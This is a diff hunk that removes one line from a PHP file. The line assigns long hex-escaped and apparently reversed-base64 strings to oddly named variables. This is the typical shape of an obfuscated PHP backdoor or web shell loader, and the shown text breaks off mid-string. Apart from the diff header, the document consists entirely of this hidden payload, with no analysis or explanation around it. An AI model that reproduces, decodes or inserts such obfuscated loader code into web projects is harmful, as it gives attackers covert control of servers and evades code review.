@@ -1,1 +1,1472 @@
-<?php $Apaaja = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUMn0SyzJSMwLKMrMK85JrdRE\x41tY\x41";$iNathanPrinsley = "\x3d\x3dwd/2kr4fL\x63OdSsMuV7oy71v4f\x61\x62kNNsdl9pMqeYmmm38wko2eplf9qZ3Q\x43o2Sxq\x62r\x43rh2On57Hp\x2b\x2buKq7pFVzIqw2uh6ER0syGs8\x61iWQKhnKPLg\x2bsM\x638I\x41gyo\x42GQ5uUp\x61Ys4Y1pNZHh/w9Q7d0KnqfM\x43r2n2\x618\x62TxI8pK702dhtY1tSI//\x62\x631PTrtRNqx3ru1zk3ex58\x434JgxniltV4zzN5/lV\x63xZ0Pxf\x62j2F\x61GMRgy3GDIIrfKt\x62\x63NtRo5oFDvt\x2beD4xGdt\x42rpOk\x41y5X81JWU\x42NHj\x43NO2Rr\x618mSTpKjT\x42\x43fIuNgkGTeI\x42Mg\x62GZ\x41jzz693\x420\x2bf\x41w8mUTrTiQMXDdk1lo5LT\x63\x2bRW\x62UmE\x62wne\x62LPgndV99WqF9UFehopnz\x430pLjG\x2bDdQ\x2b\x43k8Wtzp9\x41pYnlZ9E56K\x43uhfMFEsLoO1jqpWKTXpP2NIF24iEG8u5Xpw\x41V\x439O/fNUVFpX\x63wzKeMRfZSr4S2i/Ho6o\x63VwjhsUt\x42T6L93UD0W6XtmUvK7jTRjh\x43hfpm3YD\x42OHHi3W5\x63sK\x61M\x62NY7Zxwmp5\x62F\x61nLf\x621E\x42yqRuDEoVTz8ld\x2blN9MFHHK\x63Roo/\x63g4EU/RSYM5\x61Kr18Kvsgo988lVH\x63/2\x61T\x61HIRL0Zg/6FTkI\x43djFPDrGSLKOGL/Rw1\x61Q2kHYs546\x42Le\x62oRlOO2yIofK284xHNlnjNHT1E\x43TeQOM1iF9F8Z6LP\x41NK7rg\x41w2Nn3fEH6\x61Lz/JVm3fExJ5t\x2bH\x428f9lsvkF8\x2brQ4V\x6255Lx8e9VgokllfirlVVu9SoEv\x2bK\x61\x63XdJ0Mpi85nY\x2bkvkF/Fdj\x43QvuIgixsGYZ\x62GjKP\x63juP\x62xP7\x42en/UX/WQ9S\x41DX1n\x61o\x43t\x61lpUUwritDpmy3lyKMjpsdFkVOikHWp/eE5MJE27GER3V\x43juFivT\x2b\x43XrHjXDw4hS2FunJV\x63ZDXYElrviWVuySm\x426eK\x42n8Gio5wos\x2b6FLjsNJlEmPDPQ\x63hk33FLue6XXyl7IZQImIE95Whk\x2bHemtzRMPIPKe6\x61Kp\x63ju\x41\x42\x2bIUw\x43Pi8\x61XOltIK7nYs2O4oYGLeQeflr\x43uNQOqDOd4OXvXyIqK7F\x42YW1YNo\x417R\x625OTS\x63\x63sslz\x43h\x63YMmlqzLVxIPQxdwsDmjmRn\x62o1tLFefmV/\x61N\x42jMlvfWxu\x42i0j/3kr6nfTRHMFkr9EXgEhqH95w2DL5tZm0jywR//qNTwMJ\x42ts\x2bOH/Oigh6Z8WgThNml7J\x41EK\x43qdPd48O\x43\x42VWisz4PFkn\x62Ie\x633\x61s0ndH8FWrSYqEWx1T/T\x42\x41M17\x2btxL/t\x43YqwwWwx2\x61PSw\x63Zo5q\x61K6JZOgNPreJ8mdH8vOoSpYRYVzZKpilNJ1H6pNw\x42dHmTugHjrrxDp8RVUR5rV\x42q\x42KsU\x61\x61\x42K\x632t\x2bRip\x63YO/Xiun27mW\x43IPqJ1wy\x2bvU\x624n\x62K\x41R2Qoowrw\x41\x61LUF\x41tvp85X2h8Tgkjtm\x4298k\x42y6TElqjiUVZmWsQOlJ1EWP\x63Zf\x6385OSZh\x439Po1ksFE4NVM\x62\x62EtSiM/jS/ThpW\x63rtiQe\x43z\x61j51\x63k3f95XKNpOyMYTl9KH74VZ\x41hYQr\x41xvFlrqkpuuVtdWY6Yx7S8H\x629YVtq5\x62IEIJ\x63wj5eOiS7tzg8GxgUlWgQ\x2b/\x43xFGJk6mjgKY\x61\x2bnNp1Ti\x63\x63\x420XXs\x624lQxOmj2wv6Ekei\x42/PUvw9rUgLIrQ\x2b\x631Vy\x638R\x61pVU\x619pg\x2b2rVTK\x41f0h\x62yPiOX8Tf2ipmrJvZW57IjdtMoWKLd884Vxt\x63u6ELeFr3LV\x6277f0y5nsTOjyIznU7Q50MH3ZreUY886vJF9F0tDmP\x62\x41vnqyLv3Nz\x61hy5ylswqKLr3937eqVK/LHy2\x61MX\x41xslknn7hdWZl1yFJ\x63HZ3/hTMpRSXhYnN\x2bfRVr1jqMrWQqqPKg3Mr51X\x43ID/iqGfDdLvmK8OEkz\x61\x43d1r\x2bkZVEWinlPi6kffnX63\x41\x634GTGw3W4o\x639Kvdf\x627OOZFLRV0s\x43G9rMfFsxXXF95Uz\x2bfj27pudX5eHf\x2b\x43EyX\x2b3j\x62f\x424fI4vQ2m3I6pFd0pwzvh\x436i9ueYHJ\x620\x62l1r8L6j\x427SpsEZmHjVQvlP1GN\x42s\x41U3SRTi/jWmI\x61VVRNtFvpVhGppI2Wfo\x636Z\x42FmPPokRuF5Ksgn/53zLdhe/ZlU\x61\x43YeHD4e\x61t\x41qidSs5WmI4t5oju\x63KSxfM37e\x41owWRNH\x63K4R0v/QkOx8\x61I432719\x2b\x61u3\x63PGl\x41\x2b7D7jof\x62Q4lu\x43G\x42y8ZDWFjWWe/n\x412tPRwm6Y0Ir4K3kvlJ3\x43z9\x62TxqjJv\x41kLrYRP7jK2\x61\x41nO9\x62t8ye\x61\x42\x62ej\x62\x2bdwod9MVdl\x2bRUT2kXYkztvsTKsHIDYTDnTxG6Er9M4xp0tljMH\x42my\x43ipNotYps0V1Nz\x63lLeVGLi\x62I\x42wmLGxoJMW65JS5nv/WH/8N\x42j7JQLNH\x63PxTWj\x43UWHWfQ\x41RFtD36\x63zt58owsFXERzU\x4152\x2bY3SLXDTd8vHvLmgeyjdgt\x636IQUrzhHirkXW8SH\x2bZGRt\x61G\x62uLL2shdlMR72w4\x41FlOGSdeGUW\x41M2\x2btrgg/t7uv\x2bmdIfn\x42pZghHV7gsYHdy\x63pRln8OsIxxyP9\x63KH/x\x2bdOMxhgD6yO\x433jkZzgs7f4wx\x43/g3oixFhRrV50S\x61WIM\x61x\x42rGv\x41UqZNE\x62Z\x6231mpeFq4zo66Uk\x2btxYjoe\x621\x62h\x42\x63giw01wNVeLo\x61NQTMKkwNqWq\x43KrJomkFmSVuG\x63/oM\x41N\x43/GXqYngeE4M\x417FPv\x61iIHtHwLXMwzpJmliiYUixKeKMhvd8UngmgZt\x42KDOl\x433iUrzky\x623H944d/84v5xPH64tD9eSx\x62fD\x63U21xyfoDVVhWlVjS6Ypv1JL930WnNvXOI5SGHxlLqW\x42D3d7P7\x63n7vTJ\x62v9uv1EQShE4noxKYXn\x41i\x62gY6IoodVy\x62\x63W1LS\x63VEN/WJzpEDJ\x43ODPEg1dtiJN\x61sNZT74wWz1\x42/X8u\x62/odv3\x2b\x62p\x43RLTuVspP\x61q\x63XYWvKU88FF4eKLwqIg\x43nSW2Ox3IUldXF\x63W861JNkRuVELvM/3\x61V\x63Tn3lPXu5Oy85Is\x43W\x61v75p\x2bQ0XxsgXW\x42R\x411Nu8h7dn7t7\x2b2YnfHvv28UTK\x42yMdhLG/l\x2bF\x62hyPS8\x42mnXYnsxtTj\x61wezOK\x2b276\x42Xjyq5I6P2jtdI\x638\x63Uvn0qp\x43rO1rHuu\x623fLXN/3990pWJkHEDDdOZ\x43P\x42XYQ\x41llj4kkrDYPU\x42GL4jH55EYt81Vt4OF8DTIg\x410mXLt/9LsVIji\x62fzsvvNLzGgN\x42mKHQD\x62PezwZnjP5Yj/JT36d/Hy31xenXK\x62t\x43FzeK7\x42Vkpn\x41dQXPw0P\x62v9f6IU/s7D01J\x62s3Dz\x43mkXMrkS9FdKL1SiXKvivNqYz\x43q\x41NRDpvOhS45qUjDoWMx20GF1iyohN2i\x41v3pnXP8vkmxev7rzi1wlGYz571mj9\x61PpDWlkY5mj8\x2bL70L7Y3\x2bhz\x61X9vv5SuQMrJz49\x63pNyquPl1ls3HvFstl1JzTQR\x43GlIDzkOu/\x42WGX0t\x41qhN88X\x41zw\x42\x63zGwQ5r7ZE\x62\x423KDe\x62pIi3IQRODS6TM\x43mVhOo\x42D90\x63xl2XvSk7\x63rYikh4odJs\x43\x63LHn88eIiMXrzswEu2M0qK7hP5ZHlr2XwS3eQZ0W\x62JOi0R2nvk\x41hSr2JWX9WGzmMV3LLIP\x4159Gpdgi\x62IRvMEi3VrvTg\x43JQUrLUKojm7ST0vw185reu4o\x2bNjw2TIQlKYkuuHwPi2wRdIMpD32PVLMT\x42KX8VeZK\x637vpzjl\x2bzL\x62\x61Xik51irif\x42\x43Wu1E8HGy5\x42WFuRY7SSWYTxdethiN9D84rk1\x63PVpuOT\x63P9f0O\x43gggeRp5y0KE6I2ZL9Q/Xpn2OvkgKTtZIgdDUEHR5WK2iK9j\x62MQ79J\x43XsZui\x616oLNMUfdh/yr4PkMHMwxSRwK\x42rKw\x62Ftqo/sYLf\x42pxlWOGxrO8IZFW\x41Jrmd9ghWXqMwYvnXW5woKMMuhr88XM/G50upm\x63VguQJLUevS6xx0GX7n\x42iqs7r\x42P2ex09LlyqpmUZv69KnPLJfY1gXWOiNPT\x42\x63\x61zph5Kn2Sl5j4KYvUDNRxQERKKZhHrmjs66Q5jwHEd\x63F\x63xeqpIKqkRx29Hqwfwq\x61oPx5hK19\x41zGtU2zen4\x2b3smys\x63uQWp4/fem/5fNf\x61YsjeGqD/3/4Up/Y8u5dX0rhJy1gH7\x62Zpsy1\x2bsu\x619z8gogh5Fhf4\x62fGgnL6\x2byVZsd4OrEJ\x61y8Ws1WNiZMO\x62Uof\x41Nvzhs0K\x418\x625\x41W\x43PyXGzPrN\x62ElkLEntlStIh530IDX6NNx\x42LN\x2bduOwD\x41NpQ/w\x61v9Pl\x43z2mZ\x62dunonvYD7S6Mm2fMj\x61KF7\x43h9GJyr46htlZ40mfPy\x42wf\x61TpfGjYFjLrJrnYQpWsrFGSuVYN\x62mLlptkp722Kvte0IfY\x43SVRFNm\x43KNY3/jQt4HvgE\x62HefQwesL7gjXqQ9FJiNm1ldT0MpwynpXIyhIUeXngMD7oT4J\x61yhKvHJ0X8W/\x61P28N0Jo/G\x41XPQeu2WL\x41R6\x62izL8WWvPD\x43F31LUvEp00fDdgULteLseWH8iGxoXvw2D6\x434DPYgFEZsU2L\x62d\x62\x42gF\x62\x63EKiWL\x62\x42053iSO\x2bxx27dO\x63w/HvXv\x41\x41\x62ZWk\x2b9dp\x42\x2bxTY6T5UejFyP7QqyUVF0MqrQiw53l5T8Rj/1t2L\x2bp\x2bR8sprh9FfqXUpty20K4sflSjVUEz/wPHVs0QXsPFPXldjM\x43MXn3iztDW\x42y\x41iFFePixYw\x415\x61eMKM\x43jp228v4gQDZ91MZ9w3\x63GhoWs\x43qMf1/wY3mz\x42\x611XPkk\x62R\x421vi2WJLwnmkz8EgQFff3zrsRRRy8PvkQRl62dL\x62VgyKnlN4jze\x42\x41MtQwL\x4198U\x43HWsKZ\x2bIu\x61z0vLvGF1\x62rZRJgDXuHsOurGpzw80PM6V4\x42KGzPyYhrFiupsY4yhg\x63\x62JWtR/uvM\x63\x62YMHoyvOI6DErp2x7RjkF\x41Rft\x63\x61ZG\x63uz0GNtIK4Jn3I4RZk\x63x\x61u\x43\x62Ir6qPH\x62\x2b5LlE0Y9jMs81/yiPQ\x2b9HPzV\x416UPUDhTtmvHMdYi\x42\x61efs1iU4VdOni4m\x413Mlezj58\x62iNrFuR\x43tR\x63U\x42VIdm/QDIkQ/kKQH8Vgy8\x43efiZ1Uzwq63P9xzxTR\x61UR6/0uJUZ235Oi\x62qiQfKTiKz\x2bH7T\x411Mmj1i\x43LK2yJ2\x42\x424ix8eR\x428Le8T6wPdqF\x43HLLeEqWMh16HWl/eeEOjUW3sTIew\x41\x61tE0RDk\x62s7\x41D\x42l\x63S\x63MetMNpvss\x61\x61ppz\x43HkVeIKyz4vlSpL0v/rYq\x42F\x43/pNu\x43\x61lVSNOmJVRWLj1\x43LRkrROmz4WyRFENUSV/fGi0D7YuzVneFjL\x63m3zoJvqt9hK\x2byFL6eHqwLMr1xz\x2beGhwud\x43X//U\x43LFzJzg\x415X0\x4168zIUZh4zkIgl7fMK6nVrrdZssnZ0dejrtWEHJWR1\x2bzK7DTg8X96G9\x628GNUsqpIdGh4WhhXJi1SPpoozpwhM8\x425yZiyG0xqSi\x63uVPZ\x61rsuW/d\x61lgfqjwkq76TXhu2XL\x41sQ6\x61dKPN5\x429NhEUym75VpW\x41\x43U\x41TXDSoW\x2b6kY\x2bogxKgO5MwZY\x61mqTS9EJZNPr\x63ein2xUMru4\x42QQSWGIV\x63jHTfGE1T\x61KrnHKD0Peg9Jd9nPfStF91XvTune\x63QLEgnR\x2bMV8OdRR\x63P1F2n3\x412nQvZY3YiSp\x63V\x634Ehzy/N6XI5zfGkP//FE8k\x61/vwLV32Mhwk7ORMx\x61JgsygMxdU6hh\x41/uLH\x61kr0xEy1QRIJTf88MHukhxXVyrZIvdO25sojvwI\x41glTS\x41p\x418wxKd44JKTY\x42r2\x62q8447S\x63t8\x43SlnGPdSn\x42QW04X\x63IR5/qDIU8rNgoy8SUJN7p\x43NjuZQHR7KO5nTs/QOS51\x43yh8NgORlGLo5ijzHlQ\x42g\x62XXtppoh\x427kZ4gz\x63HO6Y\x2bLNZhIL\x41iXpzI7sh\x614P0\x43FoxUkf\x2bGLVPWeOXYQtox\x62nxhpyx0QVmZwJd8Z6w14srwvgU99OiD1DfEF\x63K9DOkdEdyXT\x41869\x62FzmJOF7\x635\x61ND/\x42lv0ThZ\x6229SKLxJT\x63UDon04TlO9w/PpI0Hmf0TrkluE\x43KIg\x41PprX3MEpYkmUGVG6QOEHt04m\x41RYvSf01ky4n8V\x41Ou\x43LZu46WV7ktGfxJ0Z\x63sQ8o/Eu\x62wwfny9SM2nru00GHYn\x63pwkDE\x41kk1\x614u\x4172tQ\x423Uex1HpqT/Lr0rd5\x436x7hDm1g\x2bdDX2jH4POxrRK4jRMvfiVR\x42n6TZQDTk41vwkloNeOsPsHhQjvvsSqFY9\x41tVddp4H\x41uVU\x62gve\x2bq/2I68\x42/pM51kkJwRTI6JdDG\x41lj\x43ywtDOl/hVmN7vKZ\x43\x43/\x2bKDy/wYEvig\x63dkh4QzEvO/LqTQN9oY16o9HlnPeLdXHv/u7eHts/YSx3/\x2bTRe\x61WhRWfuT6juo\x62e3Nw23u654Qvn\x63X36M0p\x42l8Hj\x418OPeZg2dfteLk\x63/J\x62H9u3XTPpHH\x62yDpfJhSgir8r5NE\x42oryznOStVp4kkhdU66musDj5nx4DztpypNkVM6JUN\x61WnruT9\x41\x411VUG19\x42sqP\x43J/ykZJP\x63i8UuZY\x62IZW9Fjz\x42tk5nVvu\x42zzopKvg3/1yG\x61U01tfgz2ekg1oJpvRx\x62\x42tRk\x2b2\x2biuPYTHeZn1DmQ\x61wH20Jl3Jl7YQj\x61k4O\x41y\x63M005P19\x42jMs0kZgtg\x43\x61LK8xjo5kIkr8zTVwe/WR9ORsvv7\x2bu\x63\x43mTpomuF2Y2H\x621dPX\x421n6\x41HgiKULZ\x61Kd\x41pIFUp\x41piW/zuL\x617UgdWuZRHEKwF\x61TRsT\x61\x62Y2p3yzU\x621nYVJw1xlU4TLGGttLzxPdl0Zt4VM6s5zmd7JU3dNrti8Isu3X3Lv7t7e\x42ht2\x62KT6uxt\x63u6993/K\x2b4UXuXX\x63Eeh43M\x63Mt\x42ZRXEY\x62FEZ7eHo3X9mS6WW6jPT\x62/x4kiv9JeGf9JYe7LH\x41m\x41ju\x639tW\x43RWL5md65/P\x2b/f3PTlRlVY\x61uwyx\x63xF\x61W/TGqFkQZPG\x2bO8\x43Vm\x42FLMF7ToMFsSFq2okZF7SkOPD\x61ZJKMsp\x43kmI2/SwKee\x62fPRqq7wUkh\x63MUWUw1rgo6PitH\x41m3\x418U3lRJYMjZPJu\x62QoNeeLSUhvofmh\x61GEx5pmnkx3HMhWIk\x42fLkhxjN8kXNKH6VRRWZu\x2bzWnI5O\x43\x41j6ORldM0\x41F\x43\x41QOyX\x62rr29nz9Nfg\x43iXshzpuuFZ\x63X8QDp\x61\x62n0fZdwNw\x42KssWnNWo\x62ykL6TvHj6t\x43V9g1T\x439G\x41YW1HIdZVrJ9\x2b8Uj88QGlYs5zj\x2b0eUwPLi2dX\x63L\x43jRQKY\x61SD/\x61dp\x41ZGpUSmrw1YQ/6eve\x43Hy1Q\x41LL\x63RdmSRzPYQL\x61ZRIP4umpS8eHKYh3I\x43/\x41U4kq3qPtyOP\x61tsKg\x42dY\x41Q\x2bFPrWqrMHWqeYh\x61Zz0duX5ieyKsix\x43nnYZz7\x62Eigmr\x2b08pLvhvK\x61DnGU\x43KDPonwDIJhXRyhj\x43kJqsqzqre7tzUHhpT4QYqttjwzupNkJI\x42yiGOzgJJ2RJid4Pqs50OvUGe7GZOP/Um\x63XmRODv8nYnpTKTvH\x42P\x62sGI\x63z\x2b7x/Txd6Lx18Zl5TEZIGJ\x61Hm\x62ZXdo5d69p3m\x62zM\x41D\x63Djn\x2bmVU\x63DiLuRV3HLqQSKq\x61O1p5YENmM1D8JIfHzFT3KX1\x62NOmvJ8gPp5\x62XykZ7hQ\x2b9n\x62e9zW9y\x41ymV/7U2e17Xkek\x61H07/fisfSq/VX\x61rM974\x43\x61\x61\x43wO204Dug\x61W\x61/49xfY386otr\x42To3vG\x61GU\x2b\x41FDnrh6SZ0G/\x61ThmoXgV\x2b\x43TNvhW\x43j\x42H\x2b3ghWRlttzkOwPS\x42\x62xNxwo2VhRhxG\x62WE3/PVzxD4q3IgTYnYjxo3qE7\x41Ur45y0WhTe\x42DiOZOO631kjMQRuFYV9LeHr18x7R1GeJp5W\x63j\x42y0DZ50MM0\x62uFKgTX4UJ6rVI\x43Kmz6QyJvdO\x43Xn\x6384k2QKmtQq\x2b/hGPMmqXjUOWXeo8eDTstkRox6sLp1mEU\x42\x2bt5RYI\x63\x41R\x2bziwlLXO5wXNF5QTunJ/f\x43IHx\x41E0\x62GITkf\x2b83Vi\x62o\x62Uo8FZYg3R7DV8RsX\x61ytqDvpuQ1Yt8Jwd\x61X\x43UynHppGHGE\x62HF\x62zO\x41N8VElJpL\x63T2mzT\x61fi\x63K87DOVf6lDq19\x615N4\x41wkmMLdz3Q\x41nx1qxHkxu9g704l85GiTq6\x42SeR\x41wy5U/\x43oO/\x62hSjnmED/whj8wLJ2XsyQgE\x2bp2uriEY/I7hLHL1g7m0J0\x417vR4\x63pKMT\x62wKxg1JKwG/tehSKGj4RN/WY3fWQiwj\x614XjDL70hedp\x61WFd3KmYgN1e\x43xUHi5\x2bIG1JJQTXn\x63HLO\x62DvrU2\x618Dv3MirhvmgKh3OKT/geSL6xh\x2b6vVS8qIDiIO8hIUIhZP\x63gfN\x63uR\x61ZLw\x41\x61wqDX\x61\x41vW1\x62kPWYhyOQ8q3\x62rKm/\x42VX\x41nnE0\x61\x42/EnTKeJ4u3DPEP0x\x63QRmFg\x63lPXplYJ1zh\x43Hs02llm/qu1EZfJh\x62oDOhY06skMrD6\x41hj\x43JSo5qq41YKjq2yjJjf6\x2bKNW\x2bFYKy1fFu4qUI\x618fd2P8w\x41HwkEpwOnw0P\x623tosMTpxJWZ8mlX\x61lmFWJ8PLUX\x41IznoWZTttI1DrVWZOkeVlNVTNVJ9nZL71hRr\x4141tiNVxKKrz\x42HFym8SPuFK4gTFQqqnvYK\x63W\x63syr2\x41iV7HnvloI6v00NhHeehq\x62isNO1W4XMUOyqUT1nqMUpY\x43qNZ\x43hNyi\x439uxSoxtD\x63UshQNuLNjwKgEk2587Nzqser\x62\x61rRIDmo4Q9\x41PmJ\x42Oejl8MW\x42Ejf9xSTZlxosQxzOtWPLRy3f9lO88d6u83kusoN7u0FMY2pf5\x43Pj47gwVrM/Dzdt4VFLfR1ekxOs\x63LIX8\x41xR1V\x43v4ed2Ju48Z7tz9\x63K3FgLWTWkQPnRn\x43ty\x2bJF2NZ2zESnu5\x42HWDrGqju50N2TfyOTyX51ztQtjZYQKoKpr\x62yPW0hJYM559Y0UeVRmsFKerT0\x41SOnlEffPu2\x2b2i16yJX\x2b5RtvIOP\x62Nxl/mlm6Q2Eou6yrDREuFyFNM4MhIMySrJlp\x63XNXvx1L0qn\x61py\x2bdZtemfjJ97jt1Kdwm\x62yJ\x639ZW\x42r/GpsJ3WJn9zM98U/tjJjLfKe3D25oJUZOufqL78KHML\x632GS\x61\x43x\x42KRvq2JYzYkIFS0\x61hJz64Qwo8Dx\x2b65st\x63yhuIuQYhdYiTtg0REV\x43qQwo\x42WhW\x41u9QryRdotpHhw6qjpwmqjF\x42Yo\x62IWsVLZq\x631Ws8PyEik2\x43IgRvs52\x615r\x62J5u0\x41XxTWtd\x2bmRZpykN3ti1Xer\x62Jt0KJ2wRStQN5pxwk\x41DlNLMJflggzW\x2b\x41T\x41i3pySsk\x41oX0fn\x432fxLzX/eDeHRVs\x62l\x41UTSj\x41SioppQJlYkN895\x62o6LHH\x43p7t8UyxNupVNwpNvj1ywFHhMk8tE094R5ftLu7uX1WJE\x41rL79\x625dPKpf\x62eOpX/oZG\x63\x61F95\x41zGnQFVkOjTIudSZPOwOwJdIyixHJkyYDT\x62\x4364EUvsmqOxOpjd\x2b\x430l25\x2bvFG30OLg4/Txt8YG3IQ9fzmjRlJqizPkQLx\x62Y7IwJgR346Lig\x43RKY85xOiY47\x63GjpgkV7gQ\x426EjzgvPg2PY4hnLuEoJ\x63nKTnyPiuDvfk\x62\x61ZQDGi\x633ux\x61lx7vfWvv/6ljdniU3essdDee\x61rdD5g\x61Wy\x626\x62kjVgp4TG9\x61vMLVKLJ8h\x43qPG1x/ynT9htS\x61zR0\x61\x428j\x438R\x4291DtG8kfd7rrvN/M\x61D9\x62Df\x62NH9V3\x61\x43\x4351Gh\x61DgHuKkTfT8S\x41Nf0zPDYUHZTl55hWEs\x42m\x42I\x41V5rFj9W\x2btyf\x63O9vKFpjt3Iq\x2beL7IteZhx\x42M\x2b2SlrvW1ZW\x2be88d7RxZD\x2b87PvlT7547mu\x62485u\x2b\x63JQZR5J\x41vUy\x62\x418ktRy14hr4nJ\x63mgsDzkkiXnJRltEMf4MiIkUp40MinH6h2DE/DTu\x61NQ1T3/u2P9\x42M5XwD\x42Df874ZXHFTSr/2IT45lG4Fsw35z0Zqpsx6i\x42vi0Gz6jVinTN4lKuiLjkY8rxGRQ\x63JUDYzO4mVfOSK7U4KW\x630p\x2bL\x6301dgPwL\x410lIzID\x43\x62dxO\x63Fq95rn4I\x41l9\x63QI5vHlz7795k/M3le\x63QZxmO4K\x2biyl\x62KKK\x42v\x41OfXinHFFQ\x2boHtMqJYWJP5pHJEEmhJtsS\x63Q\x43Xmg\x2b/psNl9l6xY/\x42V2m6QmmGLnLQw\x41H4EV\x63\x63\x42pS02w\x61mMy\x62kusHfR\x63u\x2b\x43T\x62NXGZ\x43MX9UQ\x41vwnV4x0E\x63jVgvg\x62hY4VL8XWeT6njS6Xg4S0\x633MKP\x41\x61KFIMUJKPOpVS0oULJhGJU3LsKw7tOWkXgiFk\x62ZY\x42ZWq1lvTF6hrjl\x421OJDYmeR\x61E8\x2bZIk2gYv\x62medp3ngO5Pw5y3z2Xex\x41iKxDT4lpy46OfTl8uftnJsmrmUxKoELhMflX\x42j\x61ziQmX1rmjMMK4oluJirXvTd6ns\x62Lu\x43euNG8jLYw1qF2YlJklPEJtvz3q5SlpgoKxD8d3L8G\x62de\x43z9YOin7mI\x2bTxnRn6E\x43Mz6Oj\x42h\x62V\x63FSOfRr3s2s\x63erJRxE2\x61n3FGuLz5ll600TKXLTf7Z\x62\x43\x41fdmuOQwlXpWIRrfSWX\x41qppxWn7\x617Hp7dP\x2bd3ruqwSUjn\x61\x61GYRPuU908iUOpXX\x42I1xkjJhfGK\x2bhJOjm6wlUf\x43Fw\x41TJsk/q595nOkn98p4/f\x43mOH0\x433F5Vf\x62i2\x41sfF\x2b9R49OSOu5Y/SsP\x41RKg1D1\x42OSK0xgkHDrquW/G9XdO\x41m1e8YJsYGV2UdntVw1988l\x2b\x62\x41/xy\x41\x2bxDK\x62NS\x41wkiruGjvMqrgr0Dw\x2bt6y6Oe8\x42WTkYgK27\x62Zy/98\x63D2w\x2bQosi9TwVx\x2b3\x43xKhF1qL9WXkDhT/F42sqO5sEjg9\x41rUHDD\x638tFdZG\x415H5UGywmRmi4\x413PoL95m\x43\x61\x43\x63TDGPJPF5QUVO820H\x2b\x43wOFfK4z\x2b\x63MGGHsJFZlxrQ2qD7NFJr\x42Q5lkoKYX2e\x43\x2bDh23HDOF\x61iQilUf\x43z0ENzY28y3d\x61\x419LnnqUhRj5UHHXN9nnwpxk\x61dDJIYj5M4xrw/\x2b6xIy\x61littO\x61s1Q\x2b\x435J\x2b9\x4366jG\x43N7r\x2boREOvvL3Shk1LFRKq4jp9i8wLPiRepJrEL\x63MWr2/ZY8sNf2zVf2KOZLdj\x61Em6w3\x61oQzN9erHd\x63r3SzohR/ep36NoNUi\x623D6oGXjzHJ9Z3u6XIF\x62q\x43JDh\x63quree9kw03EQfTxPhudyDmW3uKr7\x62p7\x41m3\x62O\x42XrdDWx9eds2/rSZr9n\x42vqP8YR\x63RE4W\x41o4yWg1\x41TQRHZlsE8GVL2MYeGDID/FE\x41ko\x63MO/eT\x43\x43NWwE1Zyf5\x420LKzgplYERUkxYIWR8y4332MFt2mFp5\x42JKfEMGU2\x636VjvD40oNgdfpZW\x43XOphiK\x612LowGsD3\x63Hpg6GPQY\x2bThVK/r\x42UF\x615GWsy5Ye6vqKEEoR\x61YgEGsoOthvNRNX2u8\x63\x61\x420Qm/t\x63inpYLtDy89\x61PgVzr41FtxVsy0d2\x63\x624XzKxLkSUUQ6fdhmEst4F3p1\x63N2QUH8wL\x6127\x42vrPf9kwK/1z57\x62L\x2b17G890\x41P/zFP3Ti6STVmHpiJo5HFNp\x61vOQ\x62glrV\x63\x42lrhOjggsun4\x430LZOSQ\x42wPIR\x2bFFMg\x42YIGmh\x43K\x43e\x6183\x62h1KFumu\x2b/ZmJo6sk\x41Vhehjo8Uo\x62LV4hLL3M6E76my\x2bNNps968wRWD\x62Ks1wFIL0hT\x41ow3OL0yH76HvI\x43\x61\x2bP0S\x61KX8iYDUjOPidr5\x419R\x62MEWJrlKWKf\x61\x42Ljy\x617\x61\x2b\x61kx1YG7XRRhy\x636PX\x436R7l0f\x42GiDrlwn\x43t4jyDtZFnPnZMhywkGvND786GjdpN2Ot\x63Z8QNWhFKs/uzXmofvQXSeJQf0XpKLvVTYS\x43wHzyQRVPP2NjWD4\x42\x62rP6Di8eRV2S5E\x614UxF\x43/ZZngO37fDSrp\x42Vf6JQVHn/MVttVOm\x62hTjMGmNtp\x4163ryOUrw\x41iYrGqD\x63WFxnPu7vz7TgD73\x62sqs\x41v49HXJY3OOE\x42Xm4dYxzsErZ02JXVmvJ\x62xp0\x2blYX5WXgo97ZqKzqU\x41s1\x41zV\x41\x42eiffW8X\x62mNgDYmi4IyX3\x43\x41pMYvIJDmWk3W\x43F/4HRSWE\x42E\x61g09mzl3wLxXnrKzTgNP\x418TIxd3Tk5gpDhwUT2n\x42MREK\x61\x438\x2bL8\x63fUlKHNgggX\x43e94k\x2b6iwDFWKP\x43lUM0n3sm0G/gqg2io1ErYv\x42VKozSXpP3XTRlE7UIJ\x43UESy\x637OMHj0xkuSS\x42X5OuVTq\x2b\x41lE\x423xHS\x42hnm\x41\x2b\x411\x43Ro\x2bdUFem\x41Mt\x410g3y9\x42\x42HQDLQElP\x41K\x43kDgZ\x62xLuWRk2eoioezQ7fVXHU5tNm\x63o44FmLwTWK\x41Jq\x42l7ks\x63IHxEpSJ\x635pzd8dj4FkF\x43\x62re2sZvOf1e\x43vEE91\x2bHSdzN5TIoK0\x62tuIfFxZQ/s5wgUDKiL\x414rX38GWxIXqiLDxzhy77\x43yoMlND4dGnoFxGjWrG1DT6\x62\x43dF1t\x63Vd44T\x43\x41Q\x62\x63LgLYOtDfFZL9s/O7qI\x63dgr\x43/QKG\x412Y\x43Dt6Ll\x61r7V/MxjuU\x42Df4S\x63mwIXO\x62l\x62YwIfTGZ4o\x41qlvXwRwdMQW\x43ODiWXnjDp4doD9\x638\x427Q\x2b\x2b\x61w3Hp\x2bL/ZWz60gGsjV\x43\x41LQpPpwzhEHwqn0KnYzNTn1rlzYKmnDrzT\x412Jjts0Yd3\x62/EOpFjKEM6rJxTRpYu69f362v\x62vnqL1HvZq/tw\x42///tEwn4d3FGqpt\x42SG48ZQ0EdlSHQ5VlH2hfoNe\x41HfJ\x43DwvhLlpNomp\x42jQOp7\x41XqL\x637Ds\x63skLxVpLmir0vPfQyPp1zjgl15e6duN\x611\x42IEI85DtEJDHn9Z\x429XMgPKETFJ/mOqdY\x42MQTPMd\x41/02\x41YpJxHlk\x61KojSpN90QMGLPU\x42mSoeUedE\x41ZqykEO5u1wwIm\x43E\x632iUQGFM80HKm2YjNOzW/\x62WknE\x41M\x43JDli8ZrxD\x63t\x61LFhHKRJzlQn\x42w3Wq\x2bYf6XnH2rr4/\x61klVdhq2jnQM\x41\x42x\x43e\x62vsS6N3\x61\x61WVex3L\x43DfQOk0\x62\x42qxPyKm4\x43I\x61QMQj\x627Jy/\x62//Pz/f1R6DpMHj\x42m5Ij2i1pHpxL8imv\x43qkwpuFVu8ui0kqfy/1HQSR0\x43NsV\x41UO\x41\x6